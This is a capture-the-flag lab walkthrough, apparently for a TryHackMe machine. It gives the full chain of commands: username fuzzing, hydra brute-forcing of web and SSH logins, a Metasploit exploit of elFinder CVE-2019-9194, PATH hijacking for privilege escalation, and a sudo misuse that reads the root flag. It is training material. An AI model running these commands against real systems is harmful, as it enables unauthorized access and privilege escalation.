Add this line to /etc/hosts for Linux and windows:
10.81.186.237 lookup.thm

using nmap I discovered port 22 and 80.

### Step 1: Enumerate the Username

We will use ffuf (a fast web fuzzer) and a standard list of names to find the valid user. We will tell ffuf to hide any responses that contain the phrase "Wrong username" so we only see the valid hits.

```
ffuf -w /usr/share/seclists/Usernames/Names/names.txt -u http://lookup.thm/login.php -X POST -d "username=FUZZ&password=test" -H "Content-Type: application/x-www-form-urlencoded" -fr "Wrong username"
```
### Step 2: Brute-Force the Password

Now that you know the username is jose, you can use hydra and the famous rockyou.txt password list to find his password.
```
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong"
```

Upon logging in successfully, pay close attention to the URL you are redirected to. It will try to send you to a new subdomain (like files.lookup.thm). You will need to add that new subdomain to your /etc/hosts file just like you did with the first one before the page will load!

If you look around the web interface (usually by clicking the "About" or "Help" icon), you will see that this application is **elFinder version 2.1.47**. This specific version is notoriously vulnerable to an unauthenticated Remote Code Execution (RCE) flaw (CVE-2019-9194).

1. Open your Kali terminal and launch Metasploit:
    ```
    msfconsole
    ```
    
2. Search for the elFinder module:
    
    ```
    search elfinder
    ```
    
1. Load the command injection exploit (it should be the exiftran one):
    ```
    use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
    ```
    
2. Configure your payload. Make sure you set the RHOSTS to the subdomain you are currently on, and set your LHOST to your TryHackMe VPN IP:
    ```
    set RHOSTS files.lookup.thm
    set TARGETURI /elFinder /  <-- (If this fails, change it to /elFinder/ or wherever the app is hosted)
    set LHOST tun0
    set payload php/meterpreter/bind_tcp
    ```
    
    ```
    run
    ```

Once you get a meterpreter:
```
shell
```

Run this command to execute it and see what it does:

```
/usr/sbin/pwm
```
**Here is your hint for what comes next:**  
When you run it, you will notice that it tries to run the id command to see who you are. However, whoever wrote pwm made a huge mistake: they didn't use the absolute path (/usr/bin/id).

This means you can do a **Path Hijacking attack**!

When Linux sees the command id, it searches through a list of directories (called the $PATH) to find the executable. If we create our own fake id script and force Linux to look in our folder first, the pwm binary will run our script instead of the real one!

### Step 1: Create the fake id script

Go to the /tmp folder (where we have write permissions) and create a script that mimics the output of the real id command, but for the user think.

Run these commands one by one:
```
cd /tmp
echo '#!/bin/bash' > id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
chmod +x id
```
### Step 2: Hijack the PATH

Now, we tell Linux to look inside the /tmp folder before it looks anywhere else.

```
export PATH=/tmp:$PATH
```
(You can verify this worked by typing which id. It should now say /tmp/id instead of /usr/bin/id).

### Step 4: Brute-force the SSH Login

Because it gives you a long list of possible passwords, you don't want to try them by hand.

1. **Copy the entire list of passwords** from your terminal output.
2. Open a **new tab** on your Kali Linux machine (don't close your current shell!).
3. Paste the passwords into a new file called passwords.txt:
    ```
    nano passwords.txt
    ```
4. Use hydra to brute-force the SSH service for the think user:
    ```
    hydra -l think -P passwords.txt ssh://lookup.thm
    ```
 login: think   password: josemario.AKA(think)

The sudo -l output shows that you can run the /usr/bin/look command as **root** without needing any extra permissions.

sudo /usr/bin/look '' /root/root.txt